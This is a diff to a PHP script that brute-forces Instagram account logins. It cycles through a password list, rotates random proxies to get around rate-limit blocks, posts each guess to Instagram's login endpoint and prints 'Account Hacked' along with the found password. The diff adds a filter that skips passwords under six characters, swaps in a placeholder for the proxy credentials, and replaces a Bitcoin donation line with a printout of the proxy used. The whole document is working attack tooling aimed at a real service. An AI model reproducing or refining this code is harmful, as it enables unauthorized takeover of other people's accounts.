@@ -49,6 +49,13 @@ foreach ($passwords as $password) {
 	while ($status == "fail") {
 
 		// sleep(3); // seconds to wait before each attempt.
+
+		/* Check if Password is at least 6 characters */
+		if (strlen($password) < 6) {
+			echo "\033[36m[!]\033[0m [".$current."/".$loaded."] Password Shorter Than 6 Characters [$password] \n";
+			$current++;
+			break;
+		}
 	
 		$proxy = $proxies[array_rand($proxies)]; // get a proxy randomly from the list.
 	
@@ -58,7 +65,7 @@ foreach ($passwords as $password) {
 		  CURLOPT_URL => "https://www.instagram.com/",
 
 		  CURLOPT_PROXY => $proxy, // set random proxy.
-		  // CURLOPT_PROXYUSERPWD => "master:password", #if your proxy needs authentication..
+		  // CURLOPT_PROXYUSERPWD => "user:password", #if your proxy needs authentication..
 
 		  CURLOPT_COOKIEJAR => "cookie.txt",
 		  CURLOPT_COOKIEFILE => "cookie.txt",
@@ -92,7 +99,7 @@ foreach ($passwords as $password) {
 		  CURLOPT_URL => "https://www.instagram.com/accounts/login/ajax/",
 
 		  CURLOPT_PROXY => $proxy, // set random proxy.
-		  // CURLOPT_PROXYUSERPWD => "master:password", #if your proxy needs authentication..
+		  // CURLOPT_PROXYUSERPWD => "user:password", #if your proxy needs authentication..
 
 		  CURLOPT_COOKIEJAR => "cookie.txt",
 		  CURLOPT_COOKIEFILE => "cookie.txt",
@@ -128,7 +135,7 @@ foreach ($passwords as $password) {
 			echo "\033[33m[!]\033[0m The proxy [".str_replace("\n", "", $proxy)."] has been temporary blocked, trying with another one... \n";
 		} elseif ($json_o->authenticated == true) {
 			echo "\n\033[32m[Success!]\033[0m Account Hacked [Username: \033[36m$username \033[0m| Password: \033[36m$password\033[0m] \n\n"; // success! :D
-			exit("Was this tool useful? Donate Some Bitcoin if you think I deserve: \n\033[36m1F9GbhE44FCHZ5KzcZBrDiFQYumYapxotC\033[0m \n\n");
+			exit("Proxy used to authenticate: \033[36m".str_replace("\n", "", $proxy)."\033[0m \n\n");
 		} else {
 			echo "\033[31m[!]\033[0m [".$current."/".$loaded."] Password Incorrect [$password] \n";
 		}
